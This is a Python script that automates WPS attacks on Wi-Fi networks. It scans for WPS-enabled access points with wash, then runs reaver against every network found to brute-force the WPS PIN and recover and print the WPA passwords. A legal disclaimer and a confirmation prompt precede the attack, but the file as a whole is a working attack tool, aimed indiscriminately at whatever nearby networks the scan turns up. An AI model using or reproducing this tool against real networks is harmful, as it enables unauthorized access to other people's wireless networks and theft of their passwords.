import subprocess
import time

disclaimer_string = (
    "DISCLAIMER: Using this tool to attack networks you do not own or that you have no explicit "
    "permission to attack is illegal and highly discouraged.\n"
    "The developer takes no responsibility for the misuse of this tool."
)

# Searches for WPS Vulnerable networks using wash
# Can scan for networks with or without lock
def get_wps_targets(interface, ignoreLocked, timeout):
    targets = []

    try:
        proc = subprocess.Popen(
            ["wash", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text = True
        )

        start_time = time.time()
        for line in proc.stdout:
            if time.time() - start_time > timeout:
                proc.terminate()
                break

            if line.startswith("BSSID") or line.strip() == "":
                continue   # Skip headers and empty lines

            parts = line.split()
            if ignoreLocked == True and parts[-1].lower() == "yes":
                continue   # Skip if it is set to ignore locked

            if len(parts) >= 5:
                bssid = parts[0]
                channel = parts[1]
                targets.append((bssid, channel))

    except Exception as e:
        print("An error was found. Please report.")

    return targets

# Tries to crack into WPS using reaver
def crack_wps(interface, targets):
    cracked_pwd = []

    for target in targets:
        try:
            proc = subprocess.Popen(
                ["reaver", "-i", interface, "-b", target[0], "-c", target[1], "-vv"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text = True
            )

            for line in proc.stdout:
                if "rate limiting" in line.lower():
                    print(f"Rate limiting detected on AP {target[0]}...")
                    break

                if "timeout occured" in line.lower():
                    print(f"Bad signal or AP not responding on AP {target[0]}...")
                    break

                if "wpa psk" in line.lower():
                    print(f"Success on AP {target[0]}...")
                    
                    parts = line.split()

                    cracked_pwd.append((target[0], parts[3]))

        except Exception as e:
            print(f"Cracking failed on bssid: {target[0]}; c: {target[1]}")

    return cracked_pwd
    
interface = input("What is the name of the interface used for the scan: ")
userin = input("Do you wish to ignore networks with locked WPS? Recommended is yes. (y/n): ")
ignoreLocked = (userin.lower() == "y")
userin = input("How long should the WPS scan go for? (empty for default): ")
timeout = 30 if userin == "" else int(userin)

print("Searching for WPS enabled networks...")
wps_networks = get_wps_targets(interface, ignoreLocked, timeout)

if wps_networks == []:
    print("No networks with WPS enabled were found by wash.")
else:
    start_attack = start_attack = input(
        f"\nDo you wish to attempt to attack the vulnerable networks found?\n\n{disclaimer_string}\n\n"
        "With this info, do you still wish to launch the attack? (y/n): "
    )

    if start_attack.lower() == "n":
        print("Aborting attack. Stay legal.")
        exit(0)
        
    print(f"{len(wps_networks)} networks with WPS enabled were found.")
    print("Attempting to crack all vulnerable networks now. This may take some time...")
        
    successes = crack_wps(interface, wps_networks)

    print(f"Number of successful cracks: {len(successes)}")
        
    for success in successes:
        print(f"bssid: {success[0]} | pwd: {success[1]}")